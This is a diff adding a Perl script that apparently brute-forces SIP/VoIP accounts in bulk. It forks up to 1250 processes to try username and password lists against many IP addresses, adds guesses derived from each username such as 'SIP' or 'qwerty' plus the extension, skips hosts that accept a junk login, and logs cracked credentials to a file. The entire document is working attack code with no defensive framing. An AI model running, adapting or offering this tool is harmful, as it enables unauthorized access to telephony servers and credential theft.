@@ -1,0 +1,191 @@
+use Term::ANSIColor qw(:constants);
+use threads ('yield','stack_size' => 64*4096,'exit' => 'threads_only','stringify');
+use MCE::Shared;
+use Time::HiRes qw(gettimeofday tv_interval);
+use Parallel::ForkManager;
+use Net::SIP;
+my $ips = $ARGV[0];
+my $users = $ARGV[1];
+my $passwords = $ARGV[2];
+my $xtest= '02985724175';
+my $mthr = '1250';
+$forkmanager = new Parallel::ForkManager("$mthr");
+my $filename = 'atlast.txt';
+my $max = '2000';
+my @cont = ();
+my @foundip;
+tie my @foundip, 'MCE::Shared';
+##########open files######
+open( PASS,  "<$ips") || die " Cannot open $ips ! \n";
+chomp(@iplist = <PASS>);
+close(PASS);
+open( USERS,  "<$users") || die " Cannot open $users ! \n";
+chomp(@userlist = <USERS>);
+close(USERS);
+open( PASS,  "<$passwords") || die " Cannot open $users ! \n";
+chomp(@passlist = <PASS>);
+close(PASS);
+$i =0;
+###########################
+for my $b (0 .. $#userlist)
+{
+for my $a (0 .. $#passlist)
+{
+$i++;
+for my $i (0 .. $#iplist)
+{
+
+$ip = $iplist[$i];
+$user = $userlist[$b];
+$pass = $passlist[$a];
+printf GREEN."--- %s hosts scanned %s Pass %s TRYS %s ".RESET."\r",$ip,$user,$pass,$i;
+
+my $bad = 0;
+if (!grep {$_ eq $ip} @foundip) {
+my $x1 = "$user$user";
+my $x2 = "SIP$user";
+my $x3 = "qwerty$user";
+my $x4 = "ext$user";
+my $x5 = "Pincode$user";
+my $x6 = "test$user";
+my $x7 = "pass$user";
+my $x8 = "Ext$user";
+my $x9 = "Wifi$user";
+my $x10 = "abc$user";
+
+my $pid = $forkmanager->start and next;
+if(&test($ip,$xtest,$xtest) == 1)
+{
+print "\n[*]Bad $ip\n";
+push @foundip, $ip;
+$bad = 1;
+goto here;
+}
+if(&test($ip,$user,$user) == 1)
+{
+print "\n[*]Good $ip $user $user\n" if ($bad == 0) ;
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $user\n";
+close (OUTPUT);
+push @foundip, $ip;
+goto here;
+}
+if(&test($ip,$user,$pass) == 1)
+{
+print "\n[*]Good $ip $user $pass\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $pass\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+### Trying xtra passwords
+if(&test($ip,$user,$x1) == 1)
+{
+print "\n[*]Good $ip $user $x1\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x1\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x2) == 1)
+{
+print "\n[*]Good $ip $user $x2\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x2\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x3) == 1)
+{
+print "\n[*]Good $ip $user $x3\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x3\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x4) == 1)
+{
+print "\n[*]Good $ip $user $x4\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x4\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x5) == 1)
+{
+print "\n[*]Good $ip $user $x5\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x5\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x6) == 1)
+{
+print "\n[*]Good $ip $user $x6\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x6\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x7) == 1)
+{
+print "\n[*]Good $ip $user $x7\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x7\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x8) == 1)
+{
+print "\n[*]Good $ip $user $x8\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x8\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x9) == 1)
+{
+print "\n[*]Good $ip $user $x9\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x9\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+if(&test($ip,$user,$x10) == 1)
+{
+print "\n[*]Good $ip $user $x10\n" if($user != $xtest);
+open(OUTPUT,">>$filename");
+print OUTPUT "$ip $user $x10\n";
+close (OUTPUT);
+push @foundip, $ip;
+}
+###
+}
+here:
+#print "$i\r";
+$forkmanager->finish();
+}
+$forkmanager->wait_all_children();
+}
+}
+
+sub test($)
+{
+alarm('4');
+my $ip = shift;
+my $user = shift;
+my $pass = shift;
+if($ip && $user && $pass){
+my $ua = Net::SIP::Simple->new(outgoing_proxy => $ip,
+#        leg => "195.154.214.162:0",
+         registrar => $ip,
+         domain => $ip,
+         from => $user,
+         auth => [ $user,$pass ]
+         );
+$ua->register( expires => 1800 ) || return 0;
+#print "Cracked  $ip $user $pass\n";
+return 1;
+}
+}
+
